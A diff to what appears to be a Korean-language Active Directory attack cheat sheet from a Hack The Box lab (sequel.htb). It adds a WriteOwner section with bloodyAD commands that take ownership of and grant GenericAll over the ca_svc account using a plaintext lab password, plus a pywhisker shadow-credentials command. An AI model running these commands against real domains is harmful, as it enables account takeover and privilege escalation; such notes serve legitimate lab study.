@@ -754,3 +754,19 @@ psexec.py -k -no-pass DOMAIN/USER@<FQDN>
 ```
   
 </details>
+
+---
+<details>
+  <summary><strong>WriteOwner</strong></summary>
+
+- `WriteOwner`권한만으로는 공격이 실패.
+- 소유자로 만들어 주는 과정이 필요.
+```bash
+bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
+
+bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
+
+pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"
+```
+  
+</details>
